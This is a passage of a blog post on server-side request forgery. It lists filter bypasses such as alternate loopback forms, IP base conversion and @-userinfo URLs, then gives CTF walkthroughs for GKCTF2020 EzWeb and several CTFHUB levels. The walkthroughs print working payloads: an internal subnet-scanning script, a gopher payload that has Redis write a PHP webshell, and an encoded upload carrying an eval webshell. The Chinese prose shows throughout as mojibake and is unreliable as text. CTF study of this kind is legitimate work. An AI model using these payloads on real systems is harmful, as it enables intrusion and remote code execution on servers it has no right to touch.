title="åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡"></a>åˆ©ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡</h3><p>å¦‚æœç›®æ ‡ä»£ç é™åˆ¶è®¿é—®çš„åŸŸååªèƒ½ä¸º <a href="http://www.xxx.com/">http://www.xxx.com</a> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼š<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p><h3 id="æœ¬åœ°å›ç¯åœ°å€çš„å…¶ä»–è¡¨ç°å½¢å¼"><a href="#æœ¬åœ°å›ç¯åœ°å€çš„å…¶ä»–è¡¨ç°å½¢å¼" class="headerlink" title="æœ¬åœ°å›ç¯åœ°å€çš„å…¶ä»–è¡¨ç°å½¢å¼"></a>æœ¬åœ°å›ç¯åœ°å€çš„å…¶ä»–è¡¨ç°å½¢å¼</h3><p><strong>127.0.0.1</strong>ï¼Œé€šå¸¸è¢«ç§°ä¸ºæœ¬åœ°å›ç¯åœ°å€(Loopback Address)ï¼ŒæŒ‡æœ¬æœºçš„è™šæ‹Ÿæ¥å£ï¼Œä¸€äº›è¡¨ç¤ºæ–¹æ³•å¦‚ä¸‹(ipv6çš„åœ°å€ä½¿ç”¨httpè®¿é—®éœ€è¦åŠ [])ï¼š</p><p><a href="http://127.0.0.1/">http://127.0.0.1</a><br><a href="http://localhost/">http://localhost</a><br><a href="http://127.255.255.254/">http://127.255.255.254</a><br>127.0.0.1 - 127.255.255.254<br>http://[::1]<br>http://[::ffff:7f00:1]<br>http://[::ffff:127.0.0.1]<br><a href="http://127.0.0.1/">http://127.1</a><br><a href="http://127.0.0.1/">http://127.0.1</a><br><a href="http://0.0.0.0/">http://0:80</a></p><h3 id="IPçš„è¿›åˆ¶è½¬æ¢"><a href="#IPçš„è¿›åˆ¶è½¬æ¢" class="headerlink" title="IPçš„è¿›åˆ¶è½¬æ¢"></a>IPçš„è¿›åˆ¶è½¬æ¢</h3><p>IPåœ°å€æ˜¯ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œé€šå¸¸è¢«åˆ†å‰²ä¸º4ä¸ª8ä½äºŒè¿›åˆ¶æ•°ã€‚é€šå¸¸ç”¨â€œç‚¹åˆ†åè¿›åˆ¶â€è¡¨ç¤ºæˆï¼ˆa.b.c.dï¼‰çš„å½¢å¼ï¼Œæ‰€ä»¥IPåœ°å€çš„æ¯ä¸€æ®µå¯ä»¥ç”¨å…¶ä»–è¿›åˆ¶æ¥è½¬æ¢ã€‚ä½¿ç”¨å¦‚winç³»ç»Ÿè‡ªå¸¦çš„è®¡ç®—æœºï¼ˆç¨‹åºå‘˜æ¨¡å¼ï¼‰å°±å¯ç®€å•å®ç°IPåœ°å€çš„è¿›åˆ¶è½¬æ¢ã€‚</p><p>ç”±äºä¸€äº›ç³»ç»Ÿä¼šç›´æ¥æå–é‚®ä»¶ä¸­å†…åµŒçš„é“¾æ¥è¿›è¡Œæ£€æµ‹ï¼Œè€Œä¸€ç§æ­¤ç±»URLæ··æ·†æŠ€æœ¯é‡‡ç”¨äº†URLä¸»æœºåéƒ¨åˆ†ä¸­ä½¿ç”¨çš„ç¼–ç åå…­è¿›åˆ¶IPåœ°å€æ ¼å¼æ¥é€ƒé¿æ£€æµ‹ã€‚</p><p>ç”±äºIPåœ°å€å¯ä»¥ç”¨å¤šç§æ ¼å¼è¡¨ç¤ºï¼Œå› æ­¤å¯ä»¥åœ¨URLä¸­å¦‚ä¸‹æ‰€ç¤ºä½¿ç”¨ï¼š</p><ul><li>ç‚¹åˆ†åè¿›åˆ¶IPåœ°å€ï¼š<a href="http://127.0.0.1/">http://127.0.0.1</a></li><li>å…«è¿›åˆ¶IPåœ°å€ï¼š<a href="http://0177.0.0.1(å°†æ¯ä¸ªåè¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºå…«è¿›åˆ¶)/">http://0177.0.0.1ï¼ˆå°†æ¯ä¸ªåè¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºå…«è¿›åˆ¶ï¼‰</a></li><li>åå…­è¿›åˆ¶IPåœ°å€ï¼š<a href="http://0x7f000001æˆ–è€…http//0x7F.0.0.1%EF%BC%88%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E5%AD%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%EF%BC%89">http://0x7F000001æˆ–è€…http://0x7F.0.0.1ï¼ˆå°†æ¯ä¸ªåè¿›åˆ¶æ•°å­—è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼‰</a></li><li>æ•´æ•°æˆ–DWORD IPåœ°å€ï¼š<a href="http://2130706433(å°†åå…­è¿›åˆ¶ipè½¬æ¢ä¸ºæ•´æ•°)/">http://2130706433ï¼ˆå°†åå…­è¿›åˆ¶IPè½¬æ¢ä¸ºæ•´æ•°ï¼‰</a></li></ul><p>ç™½å«–ä¸ªè„šæœ¬</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$ip &#x3D; &#39;127.0.0.1&#39;;$ip &#x3D; explode(&#39;.&#39;,$ip);$r &#x3D; ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) &#123;    $r +&#x3D; 4294967296;&#125;echo &quot;åè¿›åˆ¶:&quot;;     &#x2F;&#x2F; 2130706433echo $r;echo &quot;å…«è¿›åˆ¶:&quot;;     &#x2F;&#x2F; 0177.0.0.1echo decoct($r);echo &quot;åå…­è¿›åˆ¶:&quot;;   &#x2F;&#x2F; 0x7f.0.0.1echo dechex($r);?&gt;</code></pre><h3 id="åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP"><a href="#åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP" class="headerlink" title="åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP"></a>åˆ©ç”¨302è·³è½¬ç»•è¿‡å†…ç½‘IP</h3><p>ç½‘ç»œä¸Šå­˜åœ¨ä¸€ä¸ªå¾ˆç¥å¥‡çš„æœåŠ¡ï¼Œç½‘å€ä¸º <a href="http://xip.io/">http://xip.io</a>ï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><p>å½“æˆ‘ä»¬è®¿é—®ï¼š<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> æ—¶ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> ã€‚åƒè¿™ç§ç½‘å€è¿˜æœ‰<a href="http://nip.io,http//sslip.io">http://nip.ioï¼Œhttp://sslip.io</a> ã€‚</p><p>è¿™ä¸ªæˆ‘åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ²¡è¯•æˆåŠŸï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><h3 id="çŸ­åœ°å€è·³è½¬ç»•è¿‡"><a href="#çŸ­åœ°å€è·³è½¬ç»•è¿‡" class="headerlink" title="çŸ­åœ°å€è·³è½¬ç»•è¿‡"></a>çŸ­åœ°å€è·³è½¬ç»•è¿‡</h3><p>å°†è¿æ¥å˜ä¸ºçŸ­é“¾æ¥</p><p>æ¯”å¦‚è¿™ç§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427205506703.png" alt="image-20220427205506703"></p><p>å®å¡”æ–¹ä¾¿æ˜¯æ–¹ä¾¿ã€‚ã€‚ã€‚ä½†æ˜¯å¤ç°æ¼æ´çš„æ—¶å€™ä¹Ÿå¤ªå®‰å…¨äº†ï¼Œå…¨ç»™æ‹¦äº†ã€‚ã€‚ã€‚ã€‚</p><h3 id="åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®å¤´"><a href="#åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®å¤´" class="headerlink" title="åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®å¤´"></a>åˆ©ç”¨ä¸å­˜åœ¨çš„åè®®å¤´ç»•è¿‡æŒ‡å®šçš„åè®®å¤´</h3><p><code>file_get_contents()</code>å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³å½“PHPçš„ <code>file_get_contents()</code> å‡½æ•°åœ¨é‡åˆ°ä¸è®¤è¯†çš„åè®®å¤´æ—¶å€™ä¼šå°†è¿™ä¸ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™æ—¶å€™åªéœ€ä¸æ–­å¾€ä¸Šè·³è½¬ç›®å½•å³å¯è¯»åˆ°æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚ï¼ˆinclude()å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„ç‰¹æ€§ï¼‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212221005.png" alt="image-20220427212221005"></p><h3 id="åˆ©ç”¨URLçš„è§£æé—®é¢˜"><a href="#åˆ©ç”¨URLçš„è§£æé—®é¢˜" class="headerlink" title="åˆ©ç”¨URLçš„è§£æé—®é¢˜"></a>åˆ©ç”¨URLçš„è§£æé—®é¢˜</h3><p>å¯ä»¥ç”¨<code>0.0.0.0</code>ç»•è¿‡å¯¹å†…ç½‘ipçš„æ£€æµ‹ï¼Œ è¿™ä¸ªIPåœ°å€è¡¨ç¤ºæ•´ä¸ªç½‘ç»œï¼Œå¯ä»¥ä»£è¡¨æœ¬æœº ipv4 çš„æ‰€æœ‰åœ°å€ï¼Œä½¿ç”¨å¦‚ä¸‹å³å¯ç»•è¿‡ï¼š</p><h3 id="åˆ©ç”¨readfileå’Œparse-urlå‡½æ•°çš„è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šçš„ç«¯å£"><a href="#åˆ©ç”¨readfileå’Œparse-urlå‡½æ•°çš„è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šçš„ç«¯å£" class="headerlink" title="åˆ©ç”¨readfileå’Œparse_urlå‡½æ•°çš„è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šçš„ç«¯å£"></a>åˆ©ç”¨readfileå’Œparse_urlå‡½æ•°çš„è§£æå·®å¼‚ç»•è¿‡æŒ‡å®šçš„ç«¯å£</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212755037.png" alt="image-20220427212755037"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212822648.png" alt="image-20220427212822648"></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a><strong>å‚è€ƒæ–‡ç« </strong></h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123006424">(4æ¡æ¶ˆæ¯) ç”¨SSRFæ‰“ç©¿å†…ç½‘_ZredamanJçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.jianshu.com/p/a5ceccfa279a">https://www.jianshu.com/p/a5ceccfa279a</a></p><p><a href="https://zhuanlan.zhihu.com/p/115222529">https://zhuanlan.zhihu.com/p/115222529</a></p><p><a href="https://blog.csdn.net/qq_43665434/article/details/115434528">https://blog.csdn.net/qq_43665434/article/details/115434528</a></p><p><a href="https://baijiahao.baidu.com/s?id=1724265374498292807&wfr=spider&for=pc">é“­è¯´ï½œå…³äºSSRFå’Œå¤šç§ç»•è¿‡æ–¹å¼ (baidu.com)</a></p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">(4æ¡æ¶ˆæ¯) SSRFåˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢_BerL1nçš„åšå®¢-CSDNåšå®¢_gopherusä½¿ç”¨</a></p><p><a href="https://blog.csdn.net/qq_38154820/article/details/109252839">(4æ¡æ¶ˆæ¯) æµ…è°ˆssrfä¸ctfé‚£äº›äº‹_åˆå¤©ç½‘å®‰å®éªŒå®¤çš„åšå®¢-CSDNåšå®¢_ctfssrf</a></p><p><a href="https://blog.csdn.net/bylfsj/article/details/105083164">(4æ¡æ¶ˆæ¯) SSRF in PHP_bylfsjçš„åšå®¢-CSDNåšå®¢</a></p><p>èµµæ€»è¿™ä¸ªæ–°åˆ©ç”¨æ–¹æ³•å…ˆæ”¾ä¸€ä¸‹</p><p><a href="https://www.zhaoj.in/read-6681.html#_SSRF">åŸºäº A å’Œ AAAA è®°å½•çš„ä¸€ç§æ–° DNS Rebinding å§¿åŠ¿â€“ä»è¥¿æ¹–è®ºå‰‘2020 Web HelloDiscuzQ é¢˜å¯¹ Blackhat ä¸Šçš„è®®é¢˜åšå‡å â€“ glzjin (zhaoj.in)</a></p><p>å·²ç»è¶…è¿‡æˆ‘çš„åŸºç¡€çŸ¥è¯†äº†</p><p>å°tipsï¼š</p><p>SSRFä¸€èˆ¬æ˜¯å…ˆæƒ³åŠæ³•å¾—åˆ°ç›®æ ‡ä¸»æœºçš„ç½‘ç»œé…ç½®ä¿¡æ¯ï¼Œå¦‚è¯»å–/etc/hostsã€/proc/net/arpã€/proc/net/fib_trie(å­˜æ”¾ç½‘ç»œé€‚é…å™¨åœ°å€)ï¼Œä»è€Œè·å¾—ç›®æ ‡ä¸»æœºçš„å†…ç½‘ç½‘æ®µå¹¶è¿›è¡Œçˆ†ç ´ï¼Œåé¢ä¸¤ä¸ªæ‰€éœ€è¦çš„æƒé™é«˜ä¸€ç‚¹ï¼Œå¯ä»¥ç”¨fileåè®®è¯»ä¸€ä¸‹</p><p><a href="https://www.cnblogs.com/Yang34/p/13914297.html">Linuxä¸­procä¿¡æ¯è·å– - Yangsir34 - åšå®¢å›­ (cnblogs.com)</a></p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h3 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb</h3><p>è¾“å…¥<a href="http://www.baidu.comä¼šå‡ºç°çš„ç™¾åº¦çš„é¡µé¢/">www.baidu.comä¼šå‡ºç°çš„ç™¾åº¦çš„é¡µé¢</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183847852.png" alt="image-20220426183847852"></p><p>ç„¶ååŠ ä¸€ä¸ªæºç é‡Œæç¤ºçš„secretå‚æ•°ï¼Œèƒ½æ‰¾åˆ°è¿™å°ä¸»æœºçš„ç½‘å¡é…ç½®ä¿¡æ¯ï¼Œå¾—åˆ°å†…ç½‘ip 10.244.80.251è€Œä¸”è¾“å…¥æ¡†å†…å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184108287.png" alt="image-20220426184108287"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨ssrfæ¥å¾—åˆ°åœ¨å†…ç½‘å…¶ä»–æœºå™¨ä¸Šçš„flag</p><p>å¯ä»¥ç”¨fileåè®®çœ‹çœ‹æºç </p><p>è¿‡æ»¤äº†file://ï¼Œå¯ä»¥ä½¿ç”¨file:/,file: ///,file:_///ç»•è¿‡</p><pre class="language-none"><code class="language-none">file: &#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</code></pre><pre class="language-none"><code class="language-none">&lt;?phpfunction curl($url)&#123;      $ch &#x3D; curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    echo curl_exec($ch);    curl_close($ch);&#125;if(isset($_GET[&#39;submit&#39;]))&#123;$url &#x3D; $_GET[&#39;url&#39;];&#x2F;&#x2F;echo $url.&quot;\n&quot;;if(preg_match(&#39;&#x2F;file\:\&#x2F;\&#x2F;|dict|\.\.\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match))&#123;&#x2F;&#x2F;var_dump($match);die(&#39;åˆ«è¿™æ ·&#39;);&#125;curl($url);&#125;if(isset($_GET[&#39;secret&#39;]))&#123;system(&#39;ifconfig&#39;);&#125;?&gt;</code></pre><p>bpä¸çŸ¥é“ä¸ºä»€ä¹ˆå¯„äº†ï¼Œæ‰«ä¸äº†è¿™ä¸ªï¼Œåªèƒ½ä¸Špythonäº†</p><pre class="language-none"><code class="language-none">import requestsa &#x3D; []url &#x3D; &quot;http:&#x2F;&#x2F;4a20197b-aba4-4baa-ac34-21588a8ab47b.node4.buuoj.cn:81&#x2F;index.php?url&#x3D;10.244.80.&#123;&#125;&amp;submit&#x3D;%E6%8F%90%E4%BA%A4&quot;for i in range(0,255):    print(i)    url1 &#x3D; url.format(i)    print(url1)    try:        r &#x3D; requests.get(url1,timeout&#x3D;1)        print(r.text)        a.append(i)        continue    except Exception as e:        print(&#39;timeout&#39;)print(a)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426181836817.png" alt="image-20220426181836817"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184230846.png" alt="image-20220426184230846"></p><p>æ ¹æ®æç¤ºæ‰¾æ‰¾ç«¯å£ï¼Œå†æµ‹ä¸€ä¸‹å‘ç°æœ‰6379ç«¯å£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426182507562.png" alt="image-20220426182507562"></p><p>è¯´æ˜å¼€å¯ç€redisæœåŠ¡</p><p>gopherusç”Ÿæˆä¸ªpayload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183028161.png" alt="image-20220426183028161"></p><p>æ”¹ä¸€ä¸‹ip</p><pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p>æ‰“è¿›å»ä¹‹åè®¿é—®ä¸€ä¸‹shell.php</p><p>(è¿™é‡Œå¦‚æœç›´æ¥æŠŠpayloadæ¥åœ¨urlçš„å‚æ•°ä¸Šéœ€è¦å†è¿›è¡Œä¸€æ¬¡urlç¼–ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183648401.png" alt="image-20220426183648401"></p><h2 id="CTFHUB-SSRF"><a href="#CTFHUB-SSRF" class="headerlink" title="CTFHUB SSRF"></a>CTFHUB SSRF</h2><h3 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h3><p>ç¡®å®šå­˜åœ¨ssrf</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204537390.png" alt="image-20220428204537390"></p><p>é¢˜ç›®è¯´äº†flagåœ¨127.0.0.1çš„flag.phpé‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204620736.png" alt="image-20220428204620736"></p><h3 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h3><p>åˆ©ç”¨fileåè®®è¯»å–æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428215911402.png" alt="image-20220428215911402"></p><p>ç”¨ç»å¯¹è·¯å¾„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428220025771.png" alt="image-20220428220025771"></p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428221558974.png" alt="image-20220428221558974"></p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>è¦æ±‚å°±æ˜¯ç»™127.0.0.1çš„flag.phpä¼ ä¸ªpostå‚æ•°keyï¼Œkeyå€¼åœ¨æºç çš„æ³¨é‡Šé‡Œ</p><p>gopherçš„urlè§£ç è¿˜æŒºç„å¹»çš„</p><p>è¯•äº†å‡ ä¸ªå°æ—¶ï¼Œå¥½å‡ ä¸ªç½‘ç«™çš„ç¼–ç è¿˜æœ‰pythonå’Œphpè‡ªå¸¦çš„urlç¼–ç çš„å‡½æ•°ï¼Œä½†æ˜¯éƒ½æœ‰ç‚¹é—®é¢˜ï¼Œæœ€åå°±åªæœ‰è¿™ä¸¤ç§æˆåŠŸäº†</p><pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;challenge-0334eacc0c1b7b0d.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D21c12d709c44fe44f99ee5ba47501882http:&#x2F;&#x2F;challenge-351296691c42d118.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.01:80&#x2F;_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A127.0.0.1%250d%250AContent-Type%3Aapplication%2Fx-www-form-urlencoded%250d%250AContent-Length%3A36%250d%250A%250d%250Akey%3D646e343c70a1b9d07661c4343b0e5e72%250d%250A</code></pre><p>ç¬¬ä¸€ä¸ªæ˜¯å¯¹</p><pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1Host:127.0.0.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 36key&#x3D;646e343c70a1b9d07661c4343b0e5e72</code></pre><p>ç”¨è°·æ­Œçš„hackbarä¸Šçš„è‡ªå¸¦çš„urlç¼–ç è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œå°†æ¢è¡Œç¬¦%0Aæ¢ä¸º%0D%0Aï¼Œç„¶åå†ç¼–ç ä¸€æ¬¡</p><p>ç¬¬äºŒä¸ªæ˜¯ç›´æ¥æ”¹ä¹‹å‰æµ‹è¯•postçš„æ—¶å€™çš„å€¼</p><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre><p>ç„¶åå†ç”¨è°·æ­Œçš„hackbarè¿›è¡Œä¸€æ¬¡ç¼–ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429113209009.png" alt="image-20220429113209009"></p><h3 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h3><p>å’Œpostå·®ä¸å¤šå—ï¼Œä½†æ˜¯è¦ä¼ çš„æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥æ”¹ä¸€ä¸‹å‰ç«¯é¡µé¢ï¼ŒåŠ ä¸ªæäº¤æŒ‰é’®ï¼ŒæŠ“åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429160323521.png" alt="image-20220429160323521"></p><p>ç„¶åç›´æ¥æŠŠæ•´ä¸ªè¯·æ±‚åŒ…æ”¹äº†hostä¹‹åå»urlç¼–ç ä¸€æ¬¡</p><pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1Host: 127.0.0.1:80Content-Length: 308Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXT85fz2P3lDnY3AwUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.50Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Connection: close------WebKitFormBoundaryXT85fz2P3lDnY3AwContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.pdf&quot;Content-Type: application&#x2F;pdf&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;------WebKitFormBoundaryXT85fz2P3lDnY3AwContent-Disposition: form-data; name&#x3D;&quot;file&quot;Ã¦ÂÂÃ¤ÂºÂ¤------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre><p>ç„¶åå†å°†%0aå˜ä¸º%0d%0aï¼Œç„¶åå†ç¼–ç ä¸€æ¬¡</p><p>æœ€ç»ˆpayload</p><pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520308%250D%250APragma%253A%2520no-cache%250D%250ACache-Control%253A%2520no-cache%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F100.0.4896.127%2520Safari%252F537.36%2520Edg%252F100.0.1185.50%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%252Cen-GB%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.pdf%2522%250D%250AContent-Type%253A%2520application%252Fpdf%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%2522a%2522%255D)%253B%253F%253E%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429162248432.png" alt="image-20220429162248432"></p><h3 id="FastCGIåè®®-1"><a 